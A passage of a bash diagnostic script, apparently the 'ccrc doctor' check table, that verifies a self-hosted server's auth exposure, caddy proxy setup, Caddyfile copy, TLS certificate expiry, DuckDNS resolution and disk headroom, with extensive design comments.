     || [ -z "${BOX_ENV_FILE:-}" ] || ! declare -F _box_env_value >/dev/null 2>&1 \
     || ! declare -F _box_unit_env >/dev/null 2>&1; then
    _dr_fail update-exposure "ccrc's own config and exposure constants are not loaded, so whether this box's update routes are gated was never measured" \
      "this is a bug in ccrc, not a fact about your box — _check_update-exposure reads this box's recorded CCRC_ROLE through _box_env_value, and the CCRC_AUTH flag and the CCRC_HOST bind through _box_unit_env, and looks for CCRC_CADDYFILE and the CCRC_DDNS_UNIT unit, all declared once in ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi
  local envok=0 role=""
  if [ -f "$BOX_ENV_FILE" ] && [ -r "$BOX_ENV_FILE" ]; then
    envok=1
    role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  fi
  if [ "$role" = fleet ]; then
    _dr_skip update-exposure "this box runs no ccrc server ($BOX_ENV_FILE records CCRC_ROLE=fleet), so no update route is served here"
    return 3
  fi
  if [ ! -f "$CCRC_UNIT_DIR/$(_dr_unit_file ccrc.service)" ] && [ -f "$CCRC_UNIT_DIR/$(_dr_unit_file ccrc-agent.service)" ]; then
    _dr_skip update-exposure "this box runs no ccrc server ($CCRC_UNIT_DIR has ccrc-agent.service and no ccrc.service), so no update route is served here"
    return 3
  fi

  # The exposure file in three states, never two: absent, readable, or THERE
  # AND UNREADABLE — the last is unmeasured, because what the service manager
  # does with it was not measured.
  local expok=0 expunread=0
  if [ -e "$CCRC_EXPOSURE_FILE" ]; then
    if [ -f "$CCRC_EXPOSURE_FILE" ] && [ -r "$CCRC_EXPOSURE_FILE" ]; then expok=1; else expunread=1; fi
  fi

  # ── ARMED ────────────────────────────────────────────────────────────────
  # Wave 8 item D (decision D): through the ONE shared reader now, `_box_unit_env`
  # — the three-state expok/expunread above is unchanged (the WARN it drives,
  # D-3596, still fires below), and so is envok, which only the role read
  # above still uses. No printed-source rule is kept here: a source is
  # printed only where its value is `on`, and there BUE_SRC is the file that
  # named it — exactly what the old `[ -z "$auth" ] || authsrc=…` line was
  # working around by hand.
  # Wave 9 R10e (D-3823): the reader's rc is kept now, and the WHY and FIX of an
  # rc 3 are captured right here — each read resets both out-params, so the
  # CCRC_HOST read below would otherwise erase this one's cause.
  local auth="" authsrc="" authrc=0 authwhy="" authfix=""
  _box_unit_env CCRC_AUTH || authrc=$?
  authwhy="$BUE_WHY"; authfix="$BUE_FIX"
  auth="$BUE_VAL"; authsrc="$BUE_SRC"

  # ── REACHABLE ────────────────────────────────────────────────────────────
  # The identical sibling read, same reader: a bare `CCRC_HOST=` in the
  # exposure file is systemd's own way of reasserting the loopback default
  # over whatever ccrc.env named, not "no opinion, keep reading ccrc.env's
  # bind" — `_box_unit_env`'s presence rule gives that for free.
  local bindhost="" bindsrc="" hostrc=0 hostwhy="" hostfix=""
  _box_unit_env CCRC_HOST || hostrc=$?
  hostwhy="$BUE_WHY"; hostfix="$BUE_FIX"
  bindhost="$BUE_VAL"; bindsrc="$BUE_SRC"
  local -a reach=()
  case "$bindhost" in
    # Empty is config.ts's default (127.0.0.1); every 127/8 address and both
    # spellings of ::1 are loopback. Everything else — a wildcard, a routable
    # address, a hostname — answers someone other than this box.
    ''|localhost|::1|'[::1]'|127.*) ;;
    *) reach+=("CCRC_HOST=$bindhost in $bindsrc") ;;
  esac
  [ ! -e "$CCRC_EXPOSURE_FILE" ] || reach+=("$CCRC_EXPOSURE_FILE exists")
  [ ! -e "$CCRC_CADDYFILE" ] || reach+=("$CCRC_CADDYFILE exists")
  # The ddns unit, in this platform's spelling. On Linux it is a PAIR, and
  # either half on its own is the evidence. On macOS `_exp_ddns_units`' Darwin
  # arm writes ONE launchd job for the pair, `app.ccrc.<unit>.plist`, and it is
  # reached through the `.service` name ONLY: `_svc_label` strips `.service`
  # and nothing else, so `_dr_unit_file` maps the `.timer` name to
  # `app.ccrc.<unit>.timer.plist`, a file nothing writes — looking it up would
  # be a second, vacuous lookup that could never find anything.
  local -a ddns=("$CCRC_DDNS_UNIT.service")
  [ "${CCD_OS:-linux}" = darwin ] || ddns+=("$CCRC_DDNS_UNIT.timer")
  local u f
  for u in "${ddns[@]}"; do
    f="$(_dr_unit_file "$u")"
    [ ! -f "$CCRC_UNIT_DIR/$f" ] || reach+=("$f is installed in $CCRC_UNIT_DIR")
  done

  if [ "$expunread" -eq 1 ]; then
    _dr_warn update-exposure "$CCRC_EXPOSURE_FILE is there and cannot be read, so whether CCRC_AUTH is on — and so whether the update routes are gated — was not measured" \
      "look at what is really there (ls -ld $CCRC_EXPOSURE_FILE; the exposure check above says what it found), then re-run ccrc expose — it rewrites the file 0600"
    return 2
  fi
  # An undecidable CCRC_AUTH WARNs only where its answer could matter: a box PROVABLY loopback-only (CCRC_HOST
  # measured, and no exposure file, Caddyfile or ddns unit) gets the loopback PASS below whatever the flag is, because
  # neither non-FAIL exit of this tail depends on it.
  if [ "$authrc" -eq 3 ] && { [ "${#reach[@]}" -gt 0 ] || [ "$hostrc" -eq 3 ]; }; then
    _dr_warn update-exposure "$authwhy, so whether CCRC_AUTH is on — and so whether the update routes are gated — was not measured" \
      "$authfix — then re-run ccrc doctor"
    return 2
  fi
  if [ "$auth" = on ]; then
    _dr_pass update-exposure "CCRC_AUTH=on (read from $authsrc) — the update routes sit behind the session gate"
    return 0
  fi
  if [ "$hostrc" -eq 3 ] && [ "${#reach[@]}" -eq 0 ]; then
    _dr_warn update-exposure "$hostwhy, so whether this box is reachable — and so whether its ungated update routes answer anyone — was not measured" \
      "$hostfix — then re-run ccrc doctor"
    return 2
  fi
  if [ "${#reach[@]}" -gt 0 ]; then
    _dr_fail update-exposure "this box is reachable ($(_dr_join "${reach[@]}")) and CCRC_AUTH is not on in $BOX_ENV_FILE or $CCRC_EXPOSURE_FILE — the update routes, and every other write route, answer anyone who can reach it" \
      "arm the gate: ccrc expose (writes CCRC_AUTH=on with CCRC_RP_ID and CCRC_ORIGIN into $CCRC_EXPOSURE_FILE), or set all three in $BOX_ENV_FILE, then restart: $(_dr_restart_hint ccrc.service)"
    return 1
  fi
  _dr_pass update-exposure "loopback only — no exposure artifact and CCRC_HOST=${bindhost:-127.0.0.1 (the default)}"
}

# ── caddy: the SYSTEM unit the D2 ceremony was supposed to arm ────────────
# Its own `systemctl`, in SYSTEM scope — NOT `_check_services`, which reads
# only `$CCRC_UNIT_DIR` user units: caddy binds :80/:444 as root and is
# nobody's user unit. The FAIL is the D2 pending state made visible: exposure
# configured, ceremony not yet run — so the remedy IS the ceremony, all three
# steps, not a pointer back to a transcript that has scrolled away.
_check_caddy() {
  if [ -z "${CCRC_EXPOSURE_FILE:-}" ] || [ -z "${CCRC_CADDYFILE:-}" ]; then
    _dr_fail caddy "ccrc's own exposure constants are not loaded, so whether caddy serves this box was never asked" \
      "this is a bug in ccrc, not a fact about your box — _check_caddy reads CCRC_EXPOSURE_FILE and CCRC_CADDYFILE, both declared once in ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi
  if [ ! -e "$CCRC_EXPOSURE_FILE" ]; then
    _dr_skip caddy "no exposure configured (no $CCRC_EXPOSURE_FILE), so no proxy is owed on this box"
    return 3
  fi
  if ! command -v systemctl >/dev/null 2>&1; then
    # A SKIP where `_check_services` FAILs on the same absence, deliberately:
    # that check has unit FILES on disk contradicted by a box that cannot run
    # them; here there is no artifact of ours — caddy is a system package on a
    # box with systemd, and a container/dev box without systemd simply has
    # nothing to measure.
    _dr_skip caddy "systemctl is not on PATH (a container, or a dev box), so the caddy system unit could not be asked — a box without systemd runs its proxy some other way"
    return 3
  fi
  local st rc
  st="$(systemctl is-active caddy 2>/dev/null)"; rc=$?
  if [ "$rc" -eq 0 ]; then
    _dr_pass caddy "the caddy system unit is active — TLS terminates there and proxies to this box's loopback server"
    return 0
  fi
  # systemd's own word is quoted back (`_check_services`' rule): "failed" and
  # "inactive" send an operator to different places, and an empty answer is a
  # unit systemd would not talk about at all — the not-yet-installed state.
  _dr_fail caddy "exposure is configured but the caddy system unit is ${st:-not known to systemd} — the root ceremony has not been run (ccrc never escalates, so these steps are the operator's)" \
    "install caddy from your distro (Debian/Ubuntu: apt install caddy), then: sudo install -m 0644 $CCRC_CADDYFILE $CCRC_CADDY_SYSTEM_FILE (a COPY — a symlink into your home is unreadable by the caddy user), then: sudo systemctl enable --now caddy"
}

# ── caddyfile: the COPY at /etc/caddy, and whether it is still the one ────
# D-166. `ccrc expose` regenerates `$CCRC_CADDYFILE`; caddy reads
# /etc/caddy/Caddyfile; nothing connects them but an operator running one
# command. Two ways that goes wrong, both measured live and both silent:
#
#   1. the ceremony was followed with `ln -sf` (which this repo printed until
#      D-165). Caddy runs as its own user and cannot traverse $HOME/.ccrc, so
#      the link resolves to nothing it may read.
#   2. `ccrc expose` was re-run and the copy never was, so caddy still serves
#      the previous origin, port or bind.
#
# BOTH are measurable WITHOUT reading /etc/caddy/Caddyfile — which matters,
# because a 0640 root:caddy file is exactly what the ceremony produces and
# doctor is not root and never escalates. `stat` needs only search permission
# on /etc/caddy (0755 from the distro package), so a symlink is visible as a
# symlink and mtimes compare without either file being readable.
_check_caddyfile() {
  local sys="${CCRC_CADDY_SYSTEM_FILE:-}"
  if [ -z "${CCRC_EXPOSURE_FILE:-}" ] || [ -z "${CCRC_CADDYFILE:-}" ] || [ -z "$sys" ]; then
    _dr_fail caddyfile "ccrc's own exposure constants are not loaded, so the Caddyfile caddy actually reads was never compared with the one ccrc generates" \
      "this is a bug in ccrc, not a fact about your box — _check_caddyfile reads CCRC_EXPOSURE_FILE and CCRC_CADDYFILE, both declared once in ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi
  if [ ! -e "$CCRC_EXPOSURE_FILE" ]; then
    _dr_skip caddyfile "no exposure configured (no $CCRC_EXPOSURE_FILE), so no Caddyfile is owed on this box"
    return 3
  fi
  if [ ! -e "$CCRC_CADDYFILE" ]; then
    _dr_fail caddyfile "exposure is configured but $CCRC_CADDYFILE is not there, so there is nothing for the ceremony to copy — the exposure file and the Caddyfile are written by the same run, and one without the other means that run did not finish" \
      "re-run: ccrc expose duckdns (or: ccrc expose byo) — it rewrites both files, then copy it across: sudo install -m 0644 $CCRC_CADDYFILE $sys"
    return 1
  fi
  # `-L`: a DANGLING symlink fails `-e` and would otherwise read as "never
  # copied", sending an operator to re-run a copy that is not the problem.
  if [ ! -e "$sys" ] && [ ! -L "$sys" ]; then
    _dr_fail caddyfile "$CCRC_CADDYFILE is generated but $sys is not there, so caddy is not serving what ccrc configured (if caddy is up at all, it is up on some other config)" \
      "sudo install -m 0644 $CCRC_CADDYFILE $sys, then: sudo systemctl reload caddy"
    return 1
  fi
  if [ -L "$sys" ]; then
    _dr_fail caddyfile "$sys is a SYMLINK ($(readlink "$sys" 2>/dev/null || echo 'target unreadable')) — caddy runs as its own user and cannot read a file inside your home no matter what the link points at, so this box's caddy is loading something other than the config ccrc wrote (older ccrc printed this form; it never worked)" \
      "replace the link with a copy: sudo install -m 0644 $CCRC_CADDYFILE $sys, then: sudo systemctl reload caddy"
    return 1
  fi
  # Mtimes, because contents are unreadable by design. `-nt` is false when the
  # two are equal, which is what `install` leaves behind — so only a
  # regeneration that was never copied trips this.
  if [ "$CCRC_CADDYFILE" -nt "$sys" ]; then
    _dr_fail caddyfile "$CCRC_CADDYFILE is NEWER than $sys — 'ccrc expose' regenerated the Caddyfile after the last copy, so caddy is still serving the previous origin, port or bind" \
      "copy it across and reload: sudo install -m 0644 $CCRC_CADDYFILE $sys && sudo systemctl reload caddy"
    return 1
  fi
  _dr_pass caddyfile "$sys is a regular file no older than $CCRC_CADDYFILE — the copy caddy reads is current with what ccrc generated"
}

# ── cert: what the listener actually serves, measured from inside ─────────
# `openssl s_client` to 127.0.0.1:443 with the origin's host in SNI (spec D6):
# the answer exists before DNS propagates and never depends on the WAN path.
# The handshake is the WHOLE conversation — no HTTP request is sent (the
# D-150 note above). Bounded by CCRC_DOCTOR_GH_TIMEOUT for the reason that
# knob exists: a wedged listener holding :444 without answering is precisely a
# box this check will be run on.
_check_cert() {
  if [ -z "${CCRC_EXPOSURE_FILE:-}" ] || [ -z "${CCRC_CADDY_ROOT_CA:-}" ] || ! declare -F _box_env_value >/dev/null 2>&1; then
    _dr_fail cert "ccrc's own exposure constants are not loaded, so the served certificate was never read" \
      "this is a bug in ccrc, not a fact about your box — _check_cert reads CCRC_EXPOSURE_FILE (through _box_env_value) and CCRC_CADDY_ROOT_CA, all declared once in ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi
  if [ ! -e "$CCRC_EXPOSURE_FILE" ]; then
    _dr_skip cert "no exposure configured (no $CCRC_EXPOSURE_FILE), so there is no certificate this box is supposed to be serving"
    return 3
  fi
  local origin host expmode
  origin="$(_box_env_value "$CCRC_EXPOSURE_FILE" CCRC_ORIGIN)"
  host="${origin#https://}"
  expmode="$(_box_env_value "$CCRC_EXPOSURE_FILE" CCRC_EXPOSE_MODE)"
  if [ -z "$host" ] || [ "$host" = "$origin" ]; then
    # No https:// origin means no name to put in SNI. The exposure check owns
    # that finding (it FAILs on the missing key); a second verdict here would
    # count one gap twice.
    _dr_skip cert "$CCRC_EXPOSURE_FILE names no https:// origin to ask the listener for (the exposure check FAILs on that), so there is no SNI name to measure with"
    return 3
  fi
  if ! command -v openssl >/dev/null 2>&1; then
    _dr_warn cert "openssl is not on PATH, so the served certificate could not be read" \
      "install it: sudo apt install openssl — until then nothing here can tell a fresh certificate from an expired one"
    return 2
  fi
  # Candidates: loopback first (the common all-interfaces bind), then this
  # box's own addresses (`hostname -I` — the name check's source). Caddy CAN
  # bind a single interface: live 2026-08-21, tailscaled held the tailnet
  # IP's :444, caddy took the public IP, and loopback REFUSED — a probe that
  # stopped there FAILed a box serving a perfectly good certificate. The
  # first listener that completes a handshake is the one measured.
  local -a cert_cands=(127.0.0.1)
  local cip
  if command -v hostname >/dev/null 2>&1; then
    for cip in $(hostname -I 2>/dev/null); do
      case " ${cert_cands[*]} " in *" $cip "*) ;; *) cert_cands+=("$cip") ;; esac
    done
  fi
  # SNI carries the origin's HOST — except on mode ip (stage 5, S10), where
  # the origin is a bare address and RFC 6066 says a server_name is a
  # hostname, never a literal IP: the probe goes without the extension, the
  # same shape a browser sends to https://<ip>.
  local -a sni=()
  [ "$expmode" = ip ] || sni=(-servername "$host")
  local pem="" rc=1 addr="" cert_timed_out=""
  for addr in "${cert_cands[@]}"; do
      pem="$(_plat_timeout "$CCRC_DOCTOR_GH_TIMEOUT" openssl s_client -connect "$addr:443" ${sni[@]+"${sni[@]}"} </dev/null 2>/dev/null)"; rc=$?
    [ "$rc" -eq 124 ] && cert_timed_out="$addr"
    [ "$rc" -eq 0 ] && [ -n "$pem" ] && break
  done
  if [ "$rc" -ne 0 ] || [ -z "$pem" ]; then
    if [ -n "$cert_timed_out" ]; then
      _dr_fail cert "something holds $cert_timed_out:443 but did not finish a TLS handshake within ${CCRC_DOCTOR_GH_TIMEOUT}s" \
        "whatever is on :443 is wedged — see the caddy check above, and read its log: journalctl -u caddy -n 50"
    else
      _dr_fail cert "nothing answered a TLS handshake for $host on :443 at any of this box's addresses (${cert_cands[*]})" \
        "caddy is not serving — see the caddy check above; once its unit is active, stock caddy fetches the certificate itself (and if THAT fails, the usual cause is ports 80/443 not forwarded to this box)"
    fi
    return 1
  fi
  local enddate
  enddate="$(printf '%s\n' "$pem" | openssl x509 -noout -enddate 2>/dev/null)"
  case "$enddate" in
    notAfter=?*) ;;
    *)
      _dr_fail cert "the listener at $addr:443 answered the handshake but no certificate could be read out of the answer" \
        "whatever holds :443 is probably not caddy — see the caddy check above, and look at what is listening: sudo ss -tlnp 'sport = :443'"
      return 1 ;;
  esac
  # ── mode ip (stage 5, S10): the chain is caddy's INTERNAL CA, by design ──
  # Presence is proven (a completed handshake and a parseable certificate —
  # the leaf's subject is empty on an internal cert, the address rides the
  # SANs, so presence IS the measurement), and the honest verdict is a
  # standing WARN, never PASS-green and never FAIL: the chain is not publicly
  # trusted until each device has done the trust ceremony once. The 14-day
  # floor below is skipped deliberately — the internal leaf renews every 12
  # HOURS, so the floor would cry "renewal is failing" forever on a box
  # working exactly as built.
  if [ "$expmode" = ip ]; then
    _dr_warn cert "$addr:443 serves a certificate for $host from caddy's internal CA (mode ip) — the chain is not publicly trusted, by design: a local root signs it and nothing leaves the box" \
      "the trust ceremony, once per device: on this box run 'sudo caddy trust'; for phones, install $CCRC_CADDY_ROOT_CA (iOS: Settings > General > VPN & Device Management, then General > About > Certificate Trust Settings; Android: Settings > Security > Encryption & credentials > Install a certificate > CA certificate)"
    return 2
  fi
  # GNU date turns openssl's own `notAfter=` spelling into an epoch; guarded
  # like every other external tool this file cannot do without. A cert that IS
  # being served but cannot be dated is a WARN, not a FAIL — nothing measured
  # says it is bad, and the remedy is the by-hand form of this same probe.
  local end_s now_s days
  if ! command -v date >/dev/null 2>&1 \
     || ! end_s="$(_plat_date_to_epoch "${enddate#notAfter=}")" \
     || ! now_s="$(date +%s 2>/dev/null)"; then
    _dr_warn cert "a certificate is served for $host but its expiry (\"${enddate#notAfter=}\") could not be turned into a date on this box" \
      "check it by hand: openssl s_client -connect $addr:443 -servername $host </dev/null | openssl x509 -noout -enddate"
    return 2
  fi
  days=$(( (end_s - now_s) / 86400 ))
  # 14 days, WARN below it: caddy renews around 30 days out, so a cert this
  # close means RENEWAL IS FAILING while nothing is broken yet — a morning's
  # warning, not an emergency (`_check_disk`'s two-floors reasoning; here the
  # hard floor is the handshake itself failing, which the FAIL arms above own).
  if [ "$days" -lt 14 ]; then
    _dr_warn cert "the certificate served for $host expires in $days days — under the 14-day floor (caddy renews ~30 days out, so renewal is failing)" \
      "read caddy's renewal error: journalctl -u caddy -n 50 — the usual cause is ports 80/443 no longer reaching this box"
    return 2
  fi
  _dr_pass cert "$addr:443 serves a certificate for $host, valid another $days days"
}

# ── name: the DDNS record, and where it points ────────────────────────────
# duckdns only — a BYO domain's DNS is the operator's by contract (spec D4),
# so it is a SKIP, not a measurement. The comparison side (spec D6: "to this
# box's current public IP where discoverable") is deliberately soft: WARN and
# not FAIL on a mismatch, because propagation lag is NORMAL and a red line
# every operator sees for five minutes after every update is D-139's skimmed
# yellow with a worse costume. A NAT'd box has no discoverable public address
# at all — its interfaces hold RFC1918 space — and for it resolution alone is
# the whole measurement, not a mismatch.

# `_dr_ip4_global` — the global-IPv4 classifier `_check_name` compares DNS
# records with — now lives in `ccd/ccrc` (stage 5, Task 7): `cmd_expose`'s ip
# arm measures the box's own address through the same classifier, and this
# table never runs without ccrc loaded first — sourced-by-ccrc is already its
# standing premise (`_box_env_value`, and every check's own loaded-guard).

_check_name() {
  if [ -z "${CCRC_EXPOSURE_FILE:-}" ] || [ -z "${CCRC_DDNS_UNIT:-}" ] || ! declare -F _box_env_value >/dev/null 2>&1; then
    _dr_fail name "ccrc's own exposure constants are not loaded, so whether this box's name resolves was never asked" \
      "this is a bug in ccrc, not a fact about your box — _check_name reads CCRC_EXPOSURE_FILE and CCRC_DDNS_UNIT through _box_env_value, all declared once in ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi
  if [ ! -e "$CCRC_EXPOSURE_FILE" ]; then
    _dr_skip name "no exposure configured (no $CCRC_EXPOSURE_FILE), so there is no public name to resolve"
    return 3
  fi
  # Mode ip (stage 5, S10) has NO name — that is the point of the arm. It has
  # to be said in its own words: the BYO skip below asserts a domain, and a
  # box exposed on its bare address deliberately does not have one.
  if [ "$(_box_env_value "$CCRC_EXPOSURE_FILE" CCRC_EXPOSE_MODE)" = ip ]; then
    _dr_skip name "mode ip — this box is exposed on its bare address, so there is no DNS name to resolve (no third party involved is the design)"
    return 3
  fi
  local provider domain
  provider="$(_box_env_value "$CCRC_EXPOSURE_FILE" CCRC_DDNS_PROVIDER)"
  if [ "$provider" != duckdns ]; then
    _dr_skip name "a BYO domain — its DNS is the operator's by contract (no CCRC_DDNS_PROVIDER in $CCRC_EXPOSURE_FILE), so there is no ddns record of ours to measure"
    return 3
  fi
  domain="$(_box_env_value "$CCRC_EXPOSURE_FILE" CCRC_DDNS_DOMAIN)"
  if [ -z "$domain" ]; then
    _dr_fail name "$CCRC_EXPOSURE_FILE declares CCRC_DDNS_PROVIDER=duckdns but no CCRC_DDNS_DOMAIN, so there is no name to resolve — a state only a hand-edit reaches (the verb writes the trio together)" \
      "re-run: ccrc expose duckdns — it rewrites the file with the whole duckdns set"
    return 1
  fi
  if ! command -v getent >/dev/null 2>&1; then
    _dr_warn name "getent is not on PATH, so whether $domain resolves was never measured" \
      "install it (glibc's libc-bin ships it) — until then check from any box: getent hosts $domain"
    return 2
  fi
  local out rc
  out="$(getent hosts "$domain" 2>/dev/null)"; rc=$?
  if [ "$rc" -ne 0 ] || [ -z "$out" ]; then
    # The updater remedy in this box's own vocabulary: on macOS the
    # .timer/.service pair collapses into ONE launchd job (`_exp_ddns_units`'
    # Darwin arm), so the systemd pair would be two dead ends there.
    local _upd_hint
    if [ "${CCD_OS:-linux}" = darwin ]; then
      _upd_hint="check the updater job: $(_svc_status_hint "$CCRC_DDNS_UNIT.service") — one launchd job stands in for the .timer/.service pair"
    else
      _upd_hint="check the updater: systemctl --user status $CCRC_DDNS_UNIT.timer (and journalctl --user -u $CCRC_DDNS_UNIT.service -n 20)"
    fi
    _dr_fail name "$domain does not resolve — the duckdns update has not landed (a record created moments ago, or a timer that never fired)" \
      "$_upd_hint; a fresh record can also just need a minute"
    return 1
  fi
  # First field of every answer line is an address the name resolves to.
  local -a resolved=()
  local line ip
  while IFS= read -r line; do
    ip="${line%%[[:space:]]*}"
    [ -n "$ip" ] && resolved+=("$ip")
  done <<< "$out"
  # This box's own addresses, where discoverable. `hostname -I` is guarded
  # like every external tool here; with it absent (or answering nothing) the
  # comparison half is simply not made, which is the NAT arm below.
  local -a boxips=() globals=()
  if command -v hostname >/dev/null 2>&1; then
    local hout=""
    hout="$(hostname -I 2>/dev/null)" || hout=""
    for ip in $hout; do
      boxips+=("$ip")
      if _dr_ip4_global "$ip"; then globals+=("$ip"); fi
    done
  fi
  local r
  for r in ${resolved[@]+"${resolved[@]}"}; do
    if _dr_wr_has "$r" ${boxips[@]+"${boxips[@]}"}; then
      _dr_pass name "$domain resolves to this box ($r)"
      return 0
    fi
  done
  if [ "${#globals[@]}" -gt 0 ]; then
    _dr_warn name "$domain resolves to ${resolved[0]}, but this box's own public address is ${globals[0]} — DNS propagation lag, or the last duckdns update has not landed yet" \
      "give it a few minutes and re-run; if it persists, check the updater: systemctl --user status $CCRC_DDNS_UNIT.timer"
    return 2
  fi
  _dr_pass name "$domain resolves (${resolved[0]}); this box's own public address is not discoverable from inside (NAT, or no global address on an interface), so where the record points was not compared"
}

# ── room on the filesystem $HOME is on ────────────────────────────────────
# Spec §5's "disk headroom (including the backup dir)". THREE things this
# project writes land on one filesystem and all three fail unhelpfully when it
# is full: a ccd workspace is a full clone per session, every deploy leaves
# another `~/ccrc-backups/<ts>/` (each deploy.sh arm's `mkdir -p ~/ccrc-backups/$TS`), and `~/.ccrc/coord.db` is a
# WAL database that `server/src/coord/db.ts:144-145` says outright has NO backup
# to fall back on — a truncated write there is not recoverable from that
# directory.
#
# TWO FLOORS BECAUSE THERE ARE TWO SITUATIONS: under 2 GiB the next spawn or
# deploy fails, which is a defect to fix now; under 10 GiB it is a morning's
# warning that it will. Above both, the PASS names the room it found, so
# "PASS disk" cannot be a check that measured nothing.
#
# PARSED WITH `read`, NOT `awk`/`cut`: nothing in this file resolves an external
# binary that is not the subject it is measuring (`_dr_pkg_candidates`'s reason,
# and `ccrc-wrapper-shape:49-57`'s), because doctor has to answer on a box whose
# PATH is the broken thing. `df` itself is the measured subject here, and its
# absence is its own verdict.
_check_disk() {
  if ! command -v df >/dev/null 2>&1; then
    _dr_warn disk "df is not on PATH, so this check cannot measure free space on \$HOME's filesystem" \
      "install it (coreutils on a GNU box, util-linux on some minimal images) — until then nothing here can tell you a full disk from an empty one"
    return 2
  fi

  # `-P` because POSIX output keeps every mount on ONE line: the default format
  # wraps a long device name onto its own line, and this reads the LAST line.
  # `-k` because both floors below are in KiB — `df -h` would answer "41G" and
  # the arithmetic would be nonsense.
  local out line last="" avail=""
  out="$(df -Pk "$HOME" 2>/dev/null)"
  while IFS= read -r line; do
    [ -z "$line" ] || last="$line"
  done <<< "$out"
  # shellcheck disable=SC2034  # the three leading fields are read to be dropped
  [ -z "$last" ] || read -r _dr_df_fs _dr_df_size _dr_df_used avail _dr_df_rest <<< "$last"

  case "$avail" in
    ''|*[!0-9]*)
      # A df that could not stat the filesystem (a stale mount, a dead
      # automount) exits nonzero having printed nothing, and an empty field in
      # `$(( ))` is a bash arithmetic error rather than a number. Neither may
      # become "0 GiB free", which is a FAIL about a measurement nobody made.
      _dr_warn disk "df printed nothing this check could read where the available blocks belong, so free space was never measured" \
        "check by hand: df -Pk \$HOME — a filesystem df cannot stat answers exactly this way"
      return 2 ;;
  esac

  local floor=$((2 * 1024 * 1024)) tight=$((10 * 1024 * 1024))
  local gib=$((avail / 1024 / 1024)) mib=$((avail / 1024))
  if [ "$avail" -lt "$floor" ]; then
    # MiB below the floor, because "1 GiB" and "0 GiB" are the whole range there
    # and an operator deciding what to delete needs the real number.
    _dr_fail disk "only $mib MiB free on \$HOME's filesystem — under the 2 GiB floor" \
      "free space on \$HOME's filesystem before running sessions — under 2 GiB a ccd spawn (a full clone per workspace) and the next deploy's ~/ccrc-backups/<ts>/ copy start failing, and ~/.ccrc/coord.db has no backup to fall back on"
    return 1
  fi
  if [ "$avail" -lt "$tight" ]; then
    _dr_warn disk "$gib GiB free on \$HOME's filesystem — getting tight (a ccd workspace is a full clone, and every deploy leaves another ~/ccrc-backups/<ts>/)" \
      "clear room while it is still cheap: the oldest ~/ccrc-backups/<timestamp>/ directories first, then workspaces whose PRs have merged"
    return 2
  fi
  _dr_pass disk "$gib GiB free on \$HOME's filesystem"
}

# ── the roster against the wrappers on disk ───────────────────────────────
# THE CHECK THAT FOUND D-69. It is deliberately stronger than "the wrappers
# are present and executable", because presence was never the failure mode:
# the fleet host's `claude-corp` is present, executable, and sources
# `.cc-secrets/claude-corp-oauth.env` while its roster entry says
# `{"kind":"generated"}` with no secretsFile at all. Every check that only
# stats a file passes that box.
#
# ── WHAT IT COMPARES, AND WHAT IT REFUSES TO DO ──────────────────────────
# `~/.ccrc/accounts.json` (the roster — the source of truth, hand-owned) vs.
# `~/.local/bin/<id>` (the wrappers — generated and Codex launchers are ccrc-
# owned; external launchers remain hand-made). It REPORTS disagreement and
# resolves none of it, which is `ccrc-adopt`'s own bias rule (that file's header,
# "the direction of every uncertain call") applied to a tool that cannot write
# either side.
#
# ── PATHS ONLY. THE SECRETS FILE IS NEVER OPENED ─────────────────────────
# The wrapper's secrets line names a path; this check compares that path with
# the path the roster names, and stops there. It never opens, reads, stats,
# sources or hashes the file — not even to say whether it exists — because
# doctor's output is precisely what an operator pastes into a ticket, and a
# token that is never read cannot be printed. `ccrc-doctor.test.ts` pins both
# halves: a source scan for every reading construct, and a canary token planted
# in a real secrets file that must not appear in the output.
#
# ── HOW THE TWO KINDS OF FINDING DIFFER, AND WHY THEY GET TWO LINES ──────
# The findings are sorted into two classes, and each class gets its OWN
# verdict line with its OWN remedy:
#   FAIL — the roster DESCRIBES an account and disk contradicts the
#          description. Somebody is going to act on a fact that is false.
#          Remedy: make the roster and the wrapper agree.
#   WARN — disk holds a launcher the roster describes nowhere. Ambiguous, and
#          possibly deliberate (a box may keep a launcher the fleet does not
#          drive), so it is reported and not silently passed — the same
#          treatment `ccrc-adopt` gives its own cross-check findings, which
#          print but never change its exit code. Remedy: describe it, or leave
#          it be.
# Both lines when there is something of each class, and the check returns 1.
#
# THEY USED TO BE JOINED INTO THE ONE FAIL LINE, and that was three collapses
# at one seam (Task 5 review, Important 1), measured on the reference box where
# the true reading is "one real defect (D-69) plus two deliberate launchers"
# and the joined line said "three defects": the operator was told to make the
# roster and the wrapper agree — the WRONG action for a launcher somebody keeps
# on purpose — the WARN branch's own remedy was discarded unprinted, and the
# summary counted `0 warned` while warn-class findings were on the screen.
# `ccrc-doctor.test.ts` pins it BOTH ways: one test reddens if a soft finding
# is folded back into the FAIL line, another if soft findings are dropped when
# a hard one is present.
#
# ── AN `external` ACCOUNT IS CHECKED FOR EXISTENCE, AND NOTHING ELSE ─────
# `gpt` on the reference box is a symlink to a bespoke 142-line launcher. ccrc
# RECORDS external accounts and never writes them, so lacking the generated
# shape is not a defect for one — reporting it as broken would be reporting on
# a contract nobody ever made. It is checked for exactly what ccd needs of it:
# there is an executable file at $HOME/.local/bin/<id>. Its CONTENT is never
# read, and specifically: it may be a COMPILED launcher, and it may spell its
# config dir any way it likes (`CLAUDE_CONFIG_DIR=… exec claude "$@"` on one
# line, or not set it at all).
#
# That is not a relaxation, it is a bug fix (Task 5 review, Important 3): an
# external id used to be required to be a script carrying a literal
# `export CLAUDE_CONFIG_DIR=` line, because it was fed to the set difference
# below against a candidate list built from exactly that test. Measured, a
# legitimate external account FAILED the box — `ext-bin is declared external
# but $HOME/.local/bin/ext-bin is not a script`. It passed on the reference box
# only because `gpt` happens to match.

# Membership, without a subprocess or an associative array — the caller has the
# candidate list as a plain array and needs one question answered about it.
_dr_wr_has() {
  local x="$1" y
  shift
  for y in "$@"; do [ "$y" = "$x" ] && return 0; done
  return 1
}

# IS THERE AN EXECUTABLE AT $HOME/.local/bin/<id> AT ALL — the one question
# every roster account of every kind must answer yes to, because that path is
# literally what ccd runs (ccd:9057). Three distinguishable ways to answer no,
# because an operator does something different about each: a link whose target
# was deleted is a broken install, an absent file is an install that never
# happened, and a present non-executable file is a `chmod`.
#
